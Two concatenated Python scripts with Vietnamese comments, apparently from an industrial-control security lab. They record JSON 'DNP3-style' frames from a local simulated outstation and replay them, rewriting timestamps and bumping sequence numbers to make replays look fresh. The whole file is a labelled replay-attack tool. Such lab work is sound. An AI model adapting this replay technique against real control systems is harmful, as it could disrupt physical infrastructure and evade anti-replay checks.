import argparse
import json
import logging
import socket
import time
from pathlib import Path
from typing import Any, Dict, List


LOG_FORMAT = "%(asctime)s [DNP3_REPLAY] %(levelname)s: %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger("dnp3_replay")


def load_frames(path: Path) -> List[Dict[str, Any]]:
    frames: List[Dict[str, Any]] = []
    if not path.is_file():
        logger.error("Replay file %s does not exist", path)
        return frames

    with path.open("r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                frame = json.loads(line)
                if isinstance(frame, dict):
                    frames.append(frame)
            except json.JSONDecodeError:
                logger.warning("Skipping invalid JSON line in replay file: %s", line)
    return frames


def send_frame(sock: socket.socket, frame: Dict[str, Any]) -> None:
    raw = json.dumps(frame).encode("utf-8") + b"\n"
    sock.sendall(raw)


 # Hàm run_replay đọc toàn bộ frame từ file JSONL và kết nối tới outstation để phát lại tuần tự (có thể lặp nhiều vòng).
def run_replay(
    host: str,
    port: int,
    replay_file: Path,
    delay: float,
    loop: bool,
) -> None:
    """
    Reconnect to the outstation and re-send previously captured frames from a JSONL file.

    The replay file is expected to contain one JSON object per line, typically frames
    captured from master->outstation by the proxy or another tool.
    """
    frames = load_frames(replay_file)
    if not frames:
        logger.error("No frames loaded from %s, aborting replay.", replay_file)
        return

    logger.info(
        "Starting replay to %s:%d using %d frames (delay=%.2fs, loop=%s)",
        host,
        port,
        len(frames),
        delay,
        loop,
    )

    iteration = 0
    try:
        while True:
            iteration += 1
            logger.info("Replay iteration %d", iteration)
            try:
                with socket.create_connection((host, port), timeout=5.0) as sock:
                    for idx, frame in enumerate(frames):
                        logger.warning(
                            "[REPLAY->OUTSTATION] frame #%d iteration=%d: %s",
                            idx + 1,
                            iteration,
                            frame,
                        )
                        send_frame(sock, frame)
                        if delay > 0:
                            time.sleep(delay)
                    # Optionally read any responses then close
                    sock.settimeout(2.0)
                    try:
                        data = sock.recv(4096)
                        if data:
                            logger.info(
                                "[OUTSTATION->REPLAY] raw response bytes=%r",
                                data,
                            )
                    except socket.timeout:
                        pass
            except (ConnectionRefusedError, TimeoutError, OSError) as exc:
                logger.error("Failed to connect to outstation for replay: %s", exc)
                time.sleep(2.0)

            if not loop:
                break
    except KeyboardInterrupt:
        logger.info("Replay interrupted by user.")


 # Hàm main (phiên bản 1) parse tham số CLI cho chế độ replay đơn giản với một file và gọi run_replay.
def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "DNP3-style replay attacker that re-sends previously captured JSON frames to the outstation."
        ),
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target outstation host.")
    parser.add_argument("--port", type=int, default=20000, help="Target outstation port.")
    parser.add_argument(
        "--file",
        required=True,
        help="Path to JSONL replay file (one JSON frame per line).",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay between frames in seconds.",
    )
    parser.add_argument(
        "--loop",
        action="store_true",
        help="Replay frames in an infinite loop until interrupted.",
    )
    args = parser.parse_args()

    replay_path = Path(args.file)
    run_replay(
        host=args.host,
        port=args.port,
        replay_file=replay_path,
        delay=args.delay,
        loop=args.loop,
    )


if __name__ == "__main__":
    main()

import argparse
import json
import logging
import socket
import time
from pathlib import Path
from typing import Any, Dict, List


LOG_FORMAT = "%(asctime)s [%(levelname)s] [DNP3Replay] %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger(__name__)


 # Hàm record_frames kết nối tới outstation và ghi lại các frame JSON nhận được trong một khoảng thời gian xác định.
def record_frames(
    host: str,
    port: int,
    output_path: Path,
    duration: float,
) -> None:
    """
    Connect to outstation and passively record frames for a period of time.
    Assumes the master is already talking to the outstation through e.g. the proxy.
    """
    logger.info(
        "Recording frames from %s:%d to %s for %.1fs",
        host,
        port,
        output_path,
        duration,
    )
    end_time = time.time() + duration
    frames: List[Dict[str, Any]] = []

    with socket.create_connection((host, port), timeout=5.0) as sock:
        sock.settimeout(1.0)
        buf = b""
        while time.time() < end_time:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line.strip():
                        continue
                    raw = line.decode("utf-8")
                    try:
                        frame = json.loads(raw)
                    except json.JSONDecodeError:
                        logger.warning("Invalid JSON during recording: %s", raw)
                        continue
                    frames.append(frame)
            except socket.timeout:
                continue

    output_path.write_text(
        "\n".join(json.dumps(f) for f in frames),
        encoding="utf-8",
    )
    logger.info("Recorded %d frames to %s", len(frames), output_path)


 # Hàm replay_frames đọc file frame đã ghi, cập nhật timestamp/seq rồi gửi lại tới outstation mô phỏng tấn công replay.
def replay_frames(
    host: str,
    port: int,
    input_path: Path,
    delay: float,
) -> None:
    """
    Replay previously recorded frames to the outstation.
    """
    if not input_path.is_file():
        raise FileNotFoundError(input_path)

    raw_lines = input_path.read_text(encoding="utf-8").splitlines()
    frames: List[Dict[str, Any]] = []
    for line in raw_lines:
        if not line.strip():
            continue
        try:
            frames.append(json.loads(line))
        except json.JSONDecodeError:
            logger.warning("Skipping invalid JSON in replay file: %s", line)

    logger.info(
        "Replaying %d frames from %s to %s:%d",
        len(frames),
        input_path,
        host,
        port,
    )

    with socket.create_connection((host, port), timeout=5.0) as sock:
        for frame in frames:
            # Overwrite timestamp and maybe bump seq to simulate a fresh attack
            frame["timestamp"] = time.time()
            if "seq" in frame and isinstance(frame["seq"], int):
                frame["seq"] = frame["seq"] + 10_000
            raw = json.dumps(frame).encode("utf-8") + b"\n"
            logger.warning("Replaying frame: %s", frame)
            sock.sendall(raw)
            if delay > 0:
                time.sleep(delay)


 # Hàm main (phiên bản 2) cung cấp hai sub-command: 'record' để ghi frame và 'replay' để phát lại từ file log.
def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNP3 replay attack helper (record & replay JSON frames).",
    )
    subparsers = parser.add_subparsers(dest="mode", required=True)

    rec = subparsers.add_parser("record", help="Record frames into a file.")
    rec.add_argument("--host", default="127.0.0.1", help="Host to capture from.")
    rec.add_argument("--port", type=int, default=20000, help="Port to capture from.")
    rec.add_argument(
        "--duration",
        type=float,
        default=10.0,
        help="Recording duration in seconds.",
    )
    rec.add_argument(
        "--output",
        type=str,
        default="dnp3_frames.log",
        help="Output file path for recorded frames.",
    )

    rep = subparsers.add_parser("replay", help="Replay frames from a file.")
    rep.add_argument("--host", default="127.0.0.1", help="Target outstation host.")
    rep.add_argument("--port", type=int, default=20000, help="Target outstation port.")
    rep.add_argument(
        "--input",
        type=str,
        default="dnp3_frames.log",
        help="Input file path of recorded frames.",
    )
    rep.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay between replayed frames.",
    )

    args = parser.parse_args()

    if args.mode == "record":
        record_frames(
            host=args.host,
            port=args.port,
            output_path=Path(args.output),
            duration=args.duration,
        )
    else:
        replay_frames(
            host=args.host,
            port=args.port,
            input_path=Path(args.input),
            delay=args.delay,
        )


if __name__ == "__main__":
    main()

